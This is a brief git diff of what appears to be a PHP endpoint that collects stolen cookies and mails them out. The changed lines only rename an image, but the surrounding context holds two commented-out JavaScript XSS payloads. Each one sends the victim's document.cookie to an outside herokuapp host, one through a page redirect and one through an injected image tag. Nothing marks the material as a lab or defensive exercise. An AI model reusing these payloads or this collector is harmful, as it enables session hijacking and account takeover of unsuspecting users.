@@ -37,7 +37,7 @@ if (isset($_GET["abc"])) {
     
     $mail->Send();
     
-    echo '<img src="w3html.gif" alt="hello!"  style="width: 100%; height: auto;">';
+    echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
 
 //document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
 //var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
